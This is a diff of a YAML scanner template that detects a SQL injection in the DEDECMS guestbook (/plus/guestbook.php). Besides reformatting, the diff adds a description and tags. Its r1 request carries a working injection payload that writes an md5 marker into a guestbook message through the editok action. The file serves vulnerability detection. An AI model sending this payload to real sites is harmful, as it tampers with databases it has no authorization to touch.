@@ -1,32 +1,36 @@
 id: dedecms-guestbook-sqli
 
 info:
-    name: DEDECMS Guestbook sqli
-    author: harris2015(https://github.com/harris2015)
-    severity: high
+  name: DEDECMS Guestbook sqli
+  author: harris2015
+  severity: high
+  description: |-
+    DEDECMS Guestbook存在SQL注入漏洞，攻击者可以通过漏洞执行任意SQL语句，导致数据库信息泄露。
+  tags: dedecms,sqli
+  created: 2023/08/13
 
 set:
-    r: randomInt(800000000, 1000000000)
+  r: randomInt(800000000, 1000000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /plus/guestbook.php
-            follow_redirects: true
-        expression: response.status == 200
-        output:
-            search: '"action=admin&id=(?P<articleid>\\d{1,20})".bsubmatch(response.body)'
-            articleid: search["articleid"]
-    r1:
-        request:
-            method: GET
-            path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5({{r}})),email='
-            follow_redirects: true
-        expression: response.status == 200
-    r2:
-        request:
-            method: GET
-            path: /plus/guestbook.php
-            follow_redirects: true
-        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
+  r0:
+    request:
+      method: GET
+      path: /plus/guestbook.php
+      follow_redirects: true
+    expression: response.status == 200
+    output:
+      search: '"action=admin&id=(?P<articleid>\\d{1,20})".bsubmatch(response.body)'
+      articleid: search["articleid"]
+  r1:
+    request:
+      method: GET
+      path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5({{r}})),email='
+      follow_redirects: true
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      path: /plus/guestbook.php
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
 expression: r0() && r1() && r2()
